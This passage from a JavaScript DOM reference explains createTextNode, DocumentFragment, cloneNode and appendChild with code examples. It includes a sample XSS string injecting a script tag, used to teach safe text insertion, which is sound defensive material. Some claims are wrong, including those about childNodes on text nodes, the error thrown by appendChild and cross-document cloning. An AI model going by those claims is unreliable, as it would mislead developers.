const textNode = document.createTextNode('Text');
console.log(textNode.nodeType);        // 3 (Node.TEXT_NODE)
console.log(textNode.childNodes);      // null or undefined
console.log(textNode.hasChildNodes()); // false
```

#### Node Properties

```javascript
const textNode = document.createTextNode('Sample text');
console.log(textNode.nodeType);     // 3
console.log(textNode.nodeName);     // "#text"
console.log(textNode.nodeValue);    // "Sample text"
console.log(textNode.textContent);  // "Sample text"
console.log(textNode.data);         // "Sample text"
```

### When to Use createTextNode

#### Security: Preventing XSS

`createTextNode()` prevents Cross-Site Scripting (XSS) attacks by treating all content as literal text:

```javascript
const userInput = '<script>alert("XSS")</script>';

// Unsafe - executes script
element.innerHTML = userInput;

// Safe - renders as text
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);
// Displays: <script>alert("XSS")</script> (as text, not executed)
```

#### Dynamic Text Insertion

When inserting user-generated or dynamic text content:

```javascript
function displayUsername(name) {
  const greeting = document.createElement('h1');
  const textNode = document.createTextNode(`Welcome, ${name}!`);
  greeting.appendChild(textNode);
  return greeting;
}
```

#### Performance with Multiple Text Nodes

For complex text manipulation, especially when combining with DocumentFragment:

```javascript
const fragment = document.createDocumentFragment();
const lines = ['Line 1', 'Line 2', 'Line 3'];

lines.forEach(line => {
  const textNode = document.createTextNode(line);
  const br = document.createElement('br');
  fragment.appendChild(textNode);
  fragment.appendChild(br);
});

container.appendChild(fragment); // Single reflow
```

#### Programmatic DOM Construction

When building DOM structures programmatically where text is separated from markup:

```javascript
const link = document.createElement('a');
link.href = 'https://example.com';
const linkText = document.createTextNode('Click here');
link.appendChild(linkText);
```

### Alternatives and Comparisons

#### vs. innerHTML

```javascript
// Using innerHTML
element.innerHTML = 'Text content';

// Using createTextNode
const textNode = document.createTextNode('Text content');
element.appendChild(textNode);
```

**innerHTML considerations**:

- Faster for simple text replacement
- Parses HTML markup
- Security risk with untrusted content
- Replaces all existing content
- Removes event listeners on replaced elements

**createTextNode considerations**:

- More verbose
- Always safe with untrusted content
- Preserves existing content when using `appendChild`
- Requires additional node creation/insertion

#### vs. textContent

```javascript
// Using textContent
element.textContent = 'New text';

// Using createTextNode
while (element.firstChild) {
  element.removeChild(element.firstChild);
}
const textNode = document.createTextNode('New text');
element.appendChild(textNode);
```

**textContent** is simpler for replacing all text content. **createTextNode** is better for:

- Adding text alongside existing content
- Building complex DOM structures
- Working with DocumentFragments

#### vs. innerText

```javascript
element.innerText = 'Text';
```

`innerText` considers CSS styling and triggers reflow, making it slower than `textContent` or `createTextNode()`. It also has browser compatibility differences.

### Manipulating Text Nodes

#### Accessing Text Content

```javascript
const textNode = document.createTextNode('Original text');
console.log(textNode.nodeValue);   // "Original text"
console.log(textNode.data);        // "Original text"
console.log(textNode.textContent); // "Original text"
```

#### Modifying Text Content

```javascript
const textNode = document.createTextNode('Initial text');
textNode.nodeValue = 'Modified text';
// or
textNode.data = 'Modified text';
// or
textNode.textContent = 'Modified text';
```

#### Text Node Length

```javascript
const textNode = document.createTextNode('Hello');
console.log(textNode.length);    // 5
console.log(textNode.data.length); // 5
```

#### Substring Operations

Text nodes provide methods for substring manipulation:

```javascript
const textNode = document.createTextNode('Hello World');

// substringData(offset, count)
const substring = textNode.substringData(0, 5); // "Hello"

// appendData(text)
textNode.appendData('!!!');
console.log(textNode.data); // "Hello World!!!"

// insertData(offset, text)
textNode.insertData(5, ' Beautiful');
console.log(textNode.data); // "Hello Beautiful World!!!"

// deleteData(offset, count)
textNode.deleteData(6, 10);
console.log(textNode.data); // "Hello World!!!"

// replaceData(offset, count, text)
textNode.replaceData(6, 5, 'Universe');
console.log(textNode.data); // "Hello Universe!!!"
```

### Splitting and Combining Text Nodes

#### splitText()

Splits a text node into two nodes at the specified offset:

```javascript
const textNode = document.createTextNode('HelloWorld');
element.appendChild(textNode);

const secondNode = textNode.splitText(5);
console.log(textNode.data);    // "Hello"
console.log(secondNode.data);  // "World"

// Both nodes are now children of the element
console.log(element.childNodes.length); // 2
```

**Use case**: Inserting elements within text:

```javascript
const textNode = document.createTextNode('Click here for more info');
paragraph.appendChild(textNode);

textNode.splitText(6); // Split after "Click "
const secondPart = textNode.nextSibling;
secondPart.splitText(4); // Split after "here"

const link = document.createElement('a');
link.href = '#';
const linkText = secondPart;
paragraph.replaceChild(link, linkText);
link.appendChild(linkText);
// Result: "Click <a>here</a> for more info"
```

#### normalize()

Merges adjacent text nodes into a single node:

```javascript
const parent = document.createElement('div');
parent.appendChild(document.createTextNode('First '));
parent.appendChild(document.createTextNode('Second '));
parent.appendChild(document.createTextNode('Third'));

console.log(parent.childNodes.length); // 3

parent.normalize();
console.log(parent.childNodes.length); // 1
console.log(parent.firstChild.data);   // "First Second Third"
```

### Whitespace Text Nodes

HTML parsers create text nodes for whitespace between elements:

```html
<div>
  <span>Text</span>
</div>
```

```javascript
// The div contains 3 child nodes:
// 1. Text node (whitespace/newline before <span>)
// 2. <span> element
// 3. Text node (whitespace/newline after </span>)
console.log(div.childNodes.length); // 3
console.log(div.childNodes[0].nodeType); // 3 (TEXT_NODE)
```

#### Handling Whitespace

```javascript
// Filter out whitespace-only text nodes
function getElementChildren(parent) {
  return Array.from(parent.childNodes).filter(node => {
    if (node.nodeType !== Node.TEXT_NODE) return true;
    return node.data.trim().length > 0;
  });
}

// Or use element-specific properties
const elements = parent.children; // Excludes all text nodes
const firstElement = parent.firstElementChild; // Skips text nodes
```

### Empty Text Nodes

Creating text nodes with empty strings:

```javascript
const emptyTextNode = document.createTextNode('');
console.log(emptyTextNode.length); // 0
console.log(emptyTextNode.data);   // ""
```

Empty text nodes are valid but generally unnecessary. They still occupy space in the DOM tree.

### Special Characters and Encoding

#### HTML Entities

Text nodes automatically handle special characters without entity encoding:

```javascript
const textNode = document.createTextNode('Price: $50 & up');
// Displays: Price: $50 & up (no need for &amp;)

const textNode2 = document.createTextNode('<div>Not a tag</div>');
// Displays: <div>Not a tag</div> (no need for &lt; &gt;)
```

#### Unicode and Emoji

Text nodes handle Unicode characters directly:

```javascript
const textNode = document.createTextNode('Hello 世界 🌍');
console.log(textNode.data); // "Hello 世界 🌍"
console.log(textNode.length); // Counts Unicode code points
```

#### Line Breaks

Newline characters are preserved in text nodes:

```javascript
const textNode = document.createTextNode('Line 1\nLine 2\nLine 3');
element.appendChild(textNode);
// HTML collapses whitespace by default, so appears as one line
// Use white-space: pre; CSS to preserve formatting
```

```javascript
element.style.whiteSpace = 'pre';
element.appendChild(document.createTextNode('Line 1\nLine 2\nLine 3'));
// Now displays on separate lines
```

### Performance Considerations

#### Batch Operations with DocumentFragment

Creating many text nodes individually triggers multiple reflows:

```javascript
// Inefficient - multiple reflows
for (let i = 0; i < 1000; i++) {
  const textNode = document.createTextNode(`Item ${i} `);
  container.appendChild(textNode);
}

// Efficient - single reflow
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const textNode = document.createTextNode(`Item ${i} `);
  fragment.appendChild(textNode);
}
container.appendChild(fragment);
```

#### String Concatenation vs. Multiple Text Nodes

For simple text, concatenation before creating the node is more efficient:

```javascript
// Less efficient
const text1 = document.createTextNode('Hello ');
const text2 = document.createTextNode('World');
element.appendChild(text1);
element.appendChild(text2);

// More efficient
const combinedText = document.createTextNode('Hello World');
element.appendChild(combinedText);
```

#### Memory Considerations

Text nodes consume memory. For large amounts of text, using a single node is more efficient than many small nodes.

### Browser Compatibility

`createTextNode()` is supported in all browsers including legacy versions. It's part of the original DOM Level 1 specification.

### Common Patterns

#### Safe User Content Display

```javascript
function displayUserComment(comment) {
  const container = document.createElement('div');
  container.className = 'comment';
  
  const textNode = document.createTextNode(comment);
  container.appendChild(textNode);
  
  return container;
}
```

#### Building Complex Structures

```javascript
function createLabeledInput(labelText, inputType) {
  const container = document.createElement('div');
  
  const label = document.createElement('label');
  const labelTextNode = document.createTextNode(labelText);
  label.appendChild(labelTextNode);
  
  const input = document.createElement('input');
  input.type = inputType;
  
  container.appendChild(label);
  container.appendChild(input);
  
  return container;
}
```

#### Conditional Text Insertion

```javascript
function addErrorMessage(element, hasError, message) {
  // Remove existing error text nodes
  Array.from(element.childNodes)
    .filter(node => node.nodeType === Node.TEXT_NODE)
    .forEach(node => element.removeChild(node));
  
  if (hasError) {
    const errorText = document.createTextNode(message);
    element.appendChild(errorText);
  }
}
```

#### Template Building

```javascript
function buildCard(title, description) {
  const card = document.createElement('div');
  card.className = 'card';
  
  const heading = document.createElement('h2');
  heading.appendChild(document.createTextNode(title));
  
  const content = document.createElement('p');
  content.appendChild(document.createTextNode(description));
  
  card.appendChild(heading);
  card.appendChild(content);
  
  return card;
}
```

### Edge Cases

#### Null and Undefined

```javascript
const nullText = document.createTextNode(null);
console.log(nullText.data); // "null" (converted to string)

const undefinedText = document.createTextNode(undefined);
console.log(undefinedText.data); // "undefined" (converted to string)
```

#### Non-String Values

Non-string values are automatically converted to strings:

```javascript
const numberText = document.createTextNode(123);
console.log(numberText.data); // "123"

const boolText = document.createTextNode(true);
console.log(boolText.data); // "true"

const objectText = document.createTextNode({key: 'value'});
console.log(objectText.data); // "[object Object]"
```

#### Very Long Strings

Text nodes can handle very long strings, but performance degrades with extremely large content. Consider pagination or virtualization for massive text content.

### Debugging Text Nodes

#### Identifying Text Nodes in DevTools

Text nodes appear in browser DevTools but may be collapsed or hidden depending on the tool. They display as `#text` with their content.

#### Logging Text Node Information

```javascript
function logTextNode(node) {
  if (node.nodeType === Node.TEXT_NODE) {
    console.log('Text content:', node.data);
    console.log('Length:', node.length);
    console.log('Parent:', node.parentNode?.tagName);
    console.log('Next sibling:', node.nextSibling?.nodeName);
  }
}
```

---

## createDocumentFragment

### Core Functionality

`document.createDocumentFragment()` creates a minimal document object that serves as a lightweight container for DOM nodes. It returns a `DocumentFragment` instance—a node that acts as a temporary parent for assembling DOM structures before inserting them into the main document tree.

The method takes no parameters and always returns a new, empty `DocumentFragment` object.

```javascript
const fragment = document.createDocumentFragment();
```

### DocumentFragment Characteristics

A DocumentFragment is a special node type (nodeType 11) with distinct properties:

- Has no parent node (`parentNode` is always `null`)
- Cannot be inserted into the document tree itself
- When appended to another node, only its children are inserted, not the fragment itself
- Doesn't trigger reflows or repaints until inserted into the live document
- Supports standard node manipulation methods
- Has no visual representation

The fragment's `nodeType` property equals `Node.DOCUMENT_FRAGMENT_NODE` (11). Its `nodeName` is `"#document-fragment"`.

### Primary Use Case: Batch DOM Operations

The principal purpose of DocumentFragment is optimizing DOM manipulation by batching multiple operations. Inserting nodes individually into the live document tree triggers layout recalculation after each insertion. Using a fragment defers these calculations until the final insertion:

```javascript
// Less efficient: multiple reflows
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  parent.appendChild(div); // Triggers reflow each iteration
}

// More efficient: single reflow
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  fragment.appendChild(div); // No reflow
}
parent.appendChild(fragment); // Single reflow
```

[Inference] The performance benefit becomes significant when inserting many nodes. For small numbers of nodes (under 10-20), the overhead difference is typically negligible in modern browsers.

### Fragment Insertion Behavior

When a DocumentFragment is passed to insertion methods like `appendChild()`, `insertBefore()`, or `append()`, the fragment's children are transferred to the target location while the fragment itself remains unchanged but empty:

```javascript
const fragment = document.createDocumentFragment();
const div1 = document.createElement('div');
const div2 = document.createElement('div');

fragment.appendChild(div1);
fragment.appendChild(div2);

console.log(fragment.childNodes.length); // 2

parent.appendChild(fragment);

console.log(fragment.childNodes.length); // 0 (children transferred)
console.log(parent.childNodes.length); // Increased by 2
console.log(div1.parentNode === parent); // true
```

The fragment becomes empty and reusable after insertion. Children are moved, not copied.

### Node Manipulation Methods

DocumentFragment supports standard DOM manipulation methods:

**Appending nodes:**

- `fragment.appendChild(node)` - adds node to end
- `fragment.append(...nodes)` - adds multiple nodes/strings
- `fragment.prepend(...nodes)` - adds nodes to beginning

**Inserting nodes:**

- `fragment.insertBefore(newNode, referenceNode)` - inserts before reference

**Removing nodes:**

- `fragment.removeChild(node)` - removes specific child
- `fragment.replaceChild(newNode, oldNode)` - replaces child

**Querying nodes:**

- `fragment.querySelector(selector)` - finds first matching descendant
- `fragment.querySelectorAll(selector)` - finds all matching descendants
- `fragment.getElementById(id)` - finds element by ID

**Properties:**

- `fragment.childNodes` - live NodeList of children
- `fragment.children` - live HTMLCollection of element children
- `fragment.firstChild` / `fragment.lastChild` - first/last child nodes
- `fragment.firstElementChild` / `fragment.lastElementChild` - first/last element children
- `fragment.childElementCount` - number of element children

### Query Methods on Fragments

Query methods work within the fragment's subtree:

```javascript
const fragment = document.createDocumentFragment();
const div = document.createElement('div');
div.className = 'target';
div.id = 'myDiv';
fragment.appendChild(div);

const found = fragment.querySelector('.target'); // Returns div
const foundById = fragment.getElementById('myDiv'); // Returns div
```

These queries only search the fragment's descendants, not the broader document. Once inserted into the document, these elements become queryable through document-level methods.

### Cloning Fragments

`fragment.cloneNode(deep)` creates a copy of the fragment:

```javascript
const fragment = document.createDocumentFragment();
const div = document.createElement('div');
fragment.appendChild(div);

const shallow = fragment.cloneNode(false); // Empty fragment
const deep = fragment.cloneNode(true); // Contains cloned div
```

With `deep` set to `false`, only the fragment itself is cloned (resulting in an empty fragment). With `deep` set to `true`, all descendants are recursively cloned.

### Template Element Integration

DocumentFragments work naturally with the `<template>` element. The `template.content` property returns a DocumentFragment containing the template's contents:

```javascript
const template = document.createElement('template');
template.innerHTML = `
  <div class="card">
    <h2>Title</h2>
    <p>Content</p>
  </div>
`;

// template.content is a DocumentFragment
const clone = template.content.cloneNode(true);
document.body.appendChild(clone);
```

This pattern enables efficient template instantiation. Cloning the template's content fragment creates independent copies of the template structure.

### Event Handling in Fragments

Events don't bubble beyond the fragment boundary since fragments have no parent. Event listeners attached to nodes within a fragment function normally once those nodes are inserted into the document:

```javascript
const fragment = document.createDocumentFragment();
const button = document.createElement('button');

button.addEventListener('click', () => {
  console.log('Clicked');
});

fragment.appendChild(button);
// Click listener exists but button not interactive yet

document.body.appendChild(fragment);
// Now button is in document and click listener works
```

Events dispatched on nodes within a detached fragment don't bubble to document-level listeners. Only after insertion do events participate in the full document event flow.

### Text Content and innerHTML

DocumentFragment supports `textContent` but not `innerHTML`:

```javascript
const fragment = document.createDocumentFragment();
fragment.textContent = 'Hello'; // Creates single text node child

console.log(fragment.textContent); // 'Hello'
console.log(fragment.innerHTML); // undefined (property doesn't exist)
```

The `innerHTML` property doesn't exist on DocumentFragment. To parse HTML into a fragment, use:

```javascript
const temp = document.createElement('div');
temp.innerHTML = '<div>Content</div>';

const fragment = document.createDocumentFragment();
while (temp.firstChild) {
  fragment.appendChild(temp.firstChild);
}
```

Alternatively, use `Range.createContextualFragment()`:

```javascript
const range = document.createRange();
const fragment = range.createContextualFragment('<div>Content</div>');
```

### Memory and Garbage Collection

[Inference] DocumentFragments are regular JavaScript objects subject to garbage collection when no references remain. Once a fragment's children are transferred to the document and no variables reference the fragment, it becomes eligible for collection.

Reusing the same fragment variable for multiple operations is common:

```javascript
const fragment = document.createDocumentFragment();

// First use
fragment.appendChild(div1);
parent1.appendChild(fragment); // fragment now empty

// Reuse
fragment.appendChild(div2);
parent2.appendChild(fragment); // fragment empty again
```

### Comparison with Container Elements

An alternative to DocumentFragment is creating a temporary container element:

```javascript
// Using fragment
const fragment = document.createDocumentFragment();
fragment.appendChild(child1);
fragment.appendChild(child2);
parent.appendChild(fragment); // Only children inserted

// Using container
const container = document.createElement('div');
container.appendChild(child1);
container.appendChild(child2);
parent.appendChild(container); // Container AND children inserted
```

The key difference: the fragment itself isn't inserted, only its children. With a container element, the container becomes part of the document structure. To achieve similar behavior with a container requires extracting its children:

```javascript
const container = document.createElement('div');
container.appendChild(child1);
container.appendChild(child2);

while (container.firstChild) {
  parent.appendChild(container.firstChild);
}
```

DocumentFragment provides cleaner syntax for this pattern.

### Range and Selection Integration

DocumentFragments interact with Range objects:

```javascript
const range = document.createRange();
range.selectNodeContents(sourceElement);
const fragment = range.extractContents(); // Returns DocumentFragment
```

`range.extractContents()` removes the range's content from the document and returns it in a DocumentFragment. `range.cloneContents()` similarly returns a fragment without removing the original content.

Ranges can also insert fragments:

```javascript
const range = document.createRange();
range.selectNode(targetElement);
range.insertNode(fragment);
```

### Performance Considerations

[Inference] The performance benefit of DocumentFragment comes from batching DOM operations to minimize layout recalculations. Modern browsers optimize many scenarios, reducing the relative advantage:

**Significant benefit scenarios:**

- Inserting many nodes (50+)
- Complex node structures with nested elements
- Operations triggering expensive style recalculations
- Repeated insertions in tight loops

**Minimal benefit scenarios:**

- Inserting few nodes (under 10)
- Simple, flat structures
- Modern frameworks with virtual DOM
- Operations already batched by the browser

[Inference] Browsers may optimize sequential `appendChild()` calls, deferring reflows until script execution completes. DocumentFragment remains valuable for code clarity and explicit batching guarantees.

### Limitations and Constraints

DocumentFragment has specific limitations:

**No parent node:** `fragment.parentNode` is always `null`. Fragments exist outside any document tree.

**No innerHTML:** Unlike elements, fragments don't support parsing HTML via `innerHTML`.

**No styles:** Fragments have no computed styles, `style` property, or visual representation.

**Limited compatibility with some APIs:** [Inference] Certain APIs expecting Element nodes may not accept DocumentFragment arguments.

**One-way transfer:** After insertion, children move from fragment to target. The fragment doesn't maintain references to inserted nodes.

### Common Patterns

**Building lists:**

```javascript
const fragment = document.createDocumentFragment();
items.forEach(item => {
  const li = document.createElement('li');
  li.textContent = item;
  fragment.appendChild(li);
});
list.appendChild(fragment);
```

**Table row insertion:**

```javascript
const fragment = document.createDocumentFragment();
data.forEach(row => {
  const tr = document.createElement('tr');
  row.forEach(cell => {
    const td = document.createElement('td');
    td.textContent = cell;
    tr.appendChild(td);
  });
  fragment.appendChild(tr);
});
tbody.appendChild(fragment);
```

**Conditional element assembly:**

```javascript
const fragment = document.createDocumentFragment();
if (showHeader) {
  fragment.appendChild(headerElement);
}
fragment.appendChild(contentElement);
if (showFooter) {
  fragment.appendChild(footerElement);
}
container.appendChild(fragment);
```

**Replacing multiple nodes:**

```javascript
const fragment = document.createDocumentFragment();
newNodes.forEach(node => fragment.appendChild(node));

// Remove old nodes and insert fragment
while (container.firstChild) {
  container.removeChild(container.firstChild);
}
container.appendChild(fragment);
```

### Integration with Modern APIs

DocumentFragments work with various modern DOM APIs:

**MutationObserver:** Observes changes within fragments before and after insertion.

**Custom Elements:** Fragment can contain custom elements that upgrade normally.

**Shadow DOM:** Fragments can be appended to shadow roots.

**Slots:** Slotted content can be assembled in fragments before assignment.

### Browser Support

`document.createDocumentFragment()` is supported in all browsers, including legacy versions. The DocumentFragment interface and its methods have universal support across all JavaScript-capable browsers.

The method and API are stable, standardized in the DOM specification, and unlikely to change. No polyfills or compatibility shims are necessary.

---

## cloneNode Method

### Core Functionality

The `cloneNode()` method creates a duplicate copy of a DOM node, returning a new node object that is not attached to the document tree. The method accepts a single boolean parameter controlling the depth of the copy.

```javascript
const clone = node.cloneNode(deep);
```

- `deep = true`: Clones the node and all its descendants (deep copy)
- `deep = false` or omitted: Clones only the node itself (shallow copy)

### Deep vs Shallow Cloning

**Shallow clone** (`cloneNode(false)`):

```javascript
<div id="parent" class="container">
  <p>Child paragraph</p>
  <span>Child span</span>
</div>

const parent = document.querySelector('#parent');
const shallowClone = parent.cloneNode(false);
// Result: <div id="parent" class="container"></div>
// Children are NOT copied
```

**Deep clone** (`cloneNode(true)`):

```javascript
const deepClone = parent.cloneNode(true);
// Result: <div id="parent" class="container">
//           <p>Child paragraph</p>
//           <span>Child span</span>
//         </div>
// Entire subtree is copied
```

### What Gets Cloned

The cloned node receives copies of:

- **Element attributes**: `id`, `class`, `data-*`, `style`, etc.
- **Text content**: Text nodes and their content
- **Node type**: Element, text, comment nodes maintain their type
- **Inline styles**: The `style` attribute with all inline CSS
- **All descendants** (if `deep = true`)

### What Does NOT Get Cloned

**Event listeners** do not copy to the clone:

```javascript
const button = document.querySelector('button');
button.addEventListener('click', handler);

const clone = button.cloneNode(true);
// Clone has NO event listeners
// Must reattach: clone.addEventListener('click', handler);
```

**JavaScript properties** set directly on the node object are not copied:

```javascript
const element = document.querySelector('.item');
element.customData = { value: 42 };
element.isActive = true;

const clone = element.cloneNode(true);
console.log(clone.customData); // undefined
console.log(clone.isActive);   // undefined
```

**User input state** in form elements:

```javascript
const input = document.querySelector('input');
input.value = 'User typed this';

const clone = input.cloneNode(true);
console.log(clone.value); // Empty string (default value)
// The HTML value attribute is cloned, but runtime .value property is not
```

**Computed styles** from CSS stylesheets do not transfer as properties (though the element maintains classes that will apply styles once inserted):

```javascript
const element = document.querySelector('.styled');
// element has CSS styles from stylesheet

const clone = element.cloneNode(true);
// clone has same classes but is not in DOM
// getComputedStyle(clone) returns default values until inserted
```

### Cloned Node State

The returned node exists in memory but is **not attached** to any document:

```javascript
const original = document.querySelector('.item');
const clone = original.cloneNode(true);

console.log(clone.parentNode);        // null
console.log(clone.isConnected);       // false
console.log(document.contains(clone)); // false
```

To use the clone, you must explicitly insert it:

```javascript
document.body.appendChild(clone);
// or
original.parentNode.appendChild(clone);
// or
original.after(clone);
```

### ID Attribute Duplication

`cloneNode()` copies the `id` attribute, potentially creating duplicate IDs in the document:

```javascript
<div id="unique">Original</div>

const original = document.querySelector('#unique');
const clone = original.cloneNode(true);
document.body.appendChild(clone);

// DOM now has TWO elements with id="unique" (invalid HTML)
```

This violates HTML specifications where IDs must be unique. Best practices:

```javascript
const clone = original.cloneNode(true);
clone.removeAttribute('id');
// or
clone.id = 'unique-' + Date.now();
// or
clone.id = crypto.randomUUID();
```

### Text Node Cloning

Text nodes can be cloned independently:

```javascript
const textNode = document.createTextNode('Hello');
const clone = textNode.cloneNode(); // deep parameter ignored for text nodes
console.log(clone.textContent); // "Hello"
```

For text nodes, the `deep` parameter has no effect since text nodes have no children.

### Comment and Document Fragment Cloning

**Comment nodes:**

```javascript
const comment = document.createComment('This is a comment');
const clone = comment.cloneNode();
console.log(clone.nodeValue); // "This is a comment"
```

**Document fragments:**

```javascript
const fragment = document.createDocumentFragment();
fragment.appendChild(document.createElement('div'));
fragment.appendChild(document.createElement('p'));

const clone = fragment.cloneNode(true);
console.log(clone.childNodes.length); // 2
```

### Performance Considerations

**[Inference]** Deep cloning large subtrees involves recursive copying of all descendants, which can be expensive for deeply nested or large DOM structures. Shallow cloning is significantly faster when descendants are not needed.

**[Unverified]** Modern browsers optimize cloning operations, but exact performance characteristics vary by implementation and DOM complexity.

Creating multiple clones in loops:

```javascript
// Less efficient for many clones:
for (let i = 0; i < 1000; i++) {
  const clone = template.cloneNode(true);
  container.appendChild(clone);
}

// More efficient - batch with DocumentFragment:
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const clone = template.cloneNode(true);
  fragment.appendChild(clone);
}
container.appendChild(fragment); // Single reflow
```

### Template Pattern

`cloneNode()` is essential for the `<template>` element pattern:

```html
<template id="item-template">
  <div class="item">
    <h3 class="title"></h3>
    <p class="description"></p>
  </div>
</template>
```

```javascript
const template = document.querySelector('#item-template');

function createItem(title, description) {
  const clone = template.content.cloneNode(true);
  clone.querySelector('.title').textContent = title;
  clone.querySelector('.description').textContent = description;
  return clone;
}

container.appendChild(createItem('Title', 'Description'));
```

Template content is a DocumentFragment, and cloning it provides a fresh instance for each use.

### Cloning with Data Attributes

Data attributes (`data-*`) clone along with the element:

```javascript
<div data-id="123" data-type="user" data-active="true">Content</div>

const element = document.querySelector('div');
const clone = element.cloneNode(true);

console.log(clone.dataset.id);     // "123"
console.log(clone.dataset.type);   // "user"
console.log(clone.dataset.active); // "true"
```

This makes cloning useful for duplicating elements with configuration stored in data attributes.

### Shadow DOM Cloning

When cloning an element with a shadow root, the shadow root itself does **not** clone:

```javascript
const host = document.createElement('div');
const shadow = host.attachShadow({ mode: 'open' });
shadow.innerHTML = '<p>Shadow content</p>';

const clone = host.cloneNode(true);
console.log(clone.shadowRoot); // null
```

**[Inference]** This behavior exists because shadow DOM represents encapsulated component state that typically shouldn't duplicate with the host element. Manual shadow DOM reconstruction is required if needed.

### Script Element Cloning

Cloning `<script>` elements creates copies, but cloned scripts do **not** execute automatically:

```javascript
<script id="original">console.log('Executed');</script>

const script = document.querySelector('#original');
const clone = script.cloneNode(true);
document.body.appendChild(clone);
// "Executed" does NOT log again
```

**[Inference]** Browsers prevent cloned scripts from executing to avoid unintended side effects and security issues. To execute a cloned script's code, create a new script element and copy the text content.

### Cloning Across Documents

`cloneNode()` creates a clone in the same document as the original. To clone across documents (e.g., from one iframe to another), use `importNode()`:

```javascript
// Wrong approach:
const clone = iframe.contentDocument.body.cloneNode(true);
document.body.appendChild(clone); // DOMException: ownership error

// Correct approach:
const imported = document.importNode(iframe.contentDocument.body, true);
document.body.appendChild(imported);
```

### Common Use Cases

**Duplicating list items:**

```javascript
const listItem = document.querySelector('.list-item');
const clone = listItem.cloneNode(true);
clone.querySelector('.title').textContent = 'New item';
listItem.parentNode.appendChild(clone);
```

**Creating reusable components:**

```javascript
const cardTemplate = document.querySelector('.card-template');

function createCard(data) {
  const card = cardTemplate.cloneNode(true);
  card.classList.remove('card-template');
  card.querySelector('.name').textContent = data.name;
  card.querySelector('.price').textContent = data.price;
  return card;
}
```

**Backup before modification:**

```javascript
const backup = element.cloneNode(true);
// Modify original
element.textContent = 'Modified';
// Restore if needed
element.replaceWith(backup);
```

**Animation or transition duplication:**

```javascript
// Create animated copy that fades out
const clone = element.cloneNode(true);
clone.style.position = 'absolute';
clone.style.transition = 'opacity 1s';
document.body.appendChild(clone);
setTimeout(() => clone.style.opacity = '0', 0);
```

### Memory Management

Cloned nodes are regular JavaScript objects subject to garbage collection:

```javascript
function createTemporaryClone() {
  const clone = element.cloneNode(true);
  // Process clone
  return clone;
} // clone is garbage collected if not returned/referenced
```

Holding references to many clones without inserting them into the document can consume memory. Unreferenced clones are eligible for garbage collection.

### Cloning with Web Components

Custom elements clone as standard elements, but their internal state behavior depends on implementation:

```javascript
class MyElement extends HTMLElement {
  constructor() {
    super();
    this.data = { value: 42 };
  }
}
customElements.define('my-element', MyElement);

const original = document.createElement('my-element');
const clone = original.cloneNode(true);
console.log(clone.data); // undefined (constructor runs, but instance property doesn't copy)
```

**[Inference]** Custom element constructors run for clones when inserted into the document, initializing fresh component state rather than copying the original's state.

### Attribute Node Cloning

All attributes clone to the new element:

```javascript
<div class="foo bar" id="test" data-value="123" style="color: red;">

const element = document.querySelector('div');
const clone = element.cloneNode(false);

console.log(clone.className);      // "foo bar"
console.log(clone.id);             // "test"
console.log(clone.dataset.value);  // "123"
console.log(clone.style.color);    // "red"
```

Attributes exist on the clone even before document insertion, unlike computed styles which require document context.

---

## appendChild

### Method Signature

```javascript
parentNode.appendChild(childNode)
```

Adds a node to the end of the list of children of a specified parent node. If the node already exists in the document, it is moved from its current position to the new position.

### Parameters

**childNode** (Node, required): The node to append to the parent. Can be any node type including `Element`, `Text`, `Comment`, or `DocumentFragment`.

### Return Value

Returns the appended child node (the same node that was passed as the argument). If a `DocumentFragment` is appended, returns the empty `DocumentFragment`.

### Behavior Characteristics

#### Move Semantics

When appending a node that already exists in the DOM, the node is **moved**, not copied:

```javascript
const element = document.getElementById('item');
const newParent = document.getElementById('container');

// Element is removed from old location and appended to new location
newParent.appendChild(element);
```

This is atomic - there's no moment where the element exists in both locations or neither location.

#### Insertion Position

The node is always inserted as the **last child** of the parent:

```javascript
parent.appendChild(child1);  // child1 is last
parent.appendChild(child2);  // child2 is now last
parent.appendChild(child3);  // child3 is now last
```

#### DocumentFragment Special Behavior

When appending a `DocumentFragment`, only its children are inserted, not the fragment itself:

```javascript
const fragment = document.createDocumentFragment();
fragment.appendChild(div1);
fragment.appendChild(div2);

parent.appendChild(fragment);
// parent now contains div1 and div2
// fragment is now empty
```

### Common Patterns

#### Creating and Appending Elements

```javascript
const div = document.createElement('div');
div.textContent = 'Hello';
div.className = 'message';
document.body.appendChild(div);
```

#### Building Complex Structures

```javascript
const container = document.createElement('div');
const heading = document.createElement('h2');
const paragraph = document.createElement('p');

heading.textContent = 'Title';
paragraph.textContent = 'Content';

container.appendChild(heading);
container.appendChild(paragraph);
document.body.appendChild(container);
```

#### Moving Existing Elements

```javascript
const sidebar = document.getElementById('sidebar');
const article = document.getElementById('article');

// Move article into sidebar
sidebar.appendChild(article);
```

#### Appending Text Nodes

```javascript
const textNode = document.createTextNode('Plain text content');
element.appendChild(textNode);
```

### Performance Optimization

#### DocumentFragment for Batch Operations

```javascript
// Inefficient - triggers reflow for each append
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = i;
  container.appendChild(div);  // 1000 reflows
}

// Efficient - single reflow
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = i;
  fragment.appendChild(div);
}
container.appendChild(fragment);  // 1 reflow
```

#### Detached DOM Construction

```javascript
// Build structure while detached from document
const container = document.createElement('div');
container.appendChild(header);
container.appendChild(content);
container.appendChild(footer);

// Single insertion into live DOM
document.body.appendChild(container);
```

#### Caching Parent References

```javascript
// Inefficient - repeated selector queries
for (let i = 0; i < 100; i++) {
  document.getElementById('list').appendChild(createItem(i));
}

// Efficient - single query
const list = document.getElementById('list');
for (let i = 0; i < 100; i++) {
  list.appendChild(createItem(i));
}
```

### Edge Cases and Gotchas

#### Cannot Append to Text or Comment Nodes

```javascript
const textNode = document.createTextNode('text');
textNode.appendChild(element);  // TypeError: textNode.appendChild is not a function
```

Only nodes that can have children (Element, Document, DocumentFragment) support `appendChild`.

#### Cannot Append Document Node

```javascript
element.appendChild(document);  // HierarchyRequestError
```

#### Cannot Create Circular References

```javascript
parent.appendChild(child);
child.appendChild(parent);  // HierarchyRequestError: The operation would yield an incorrect node tree
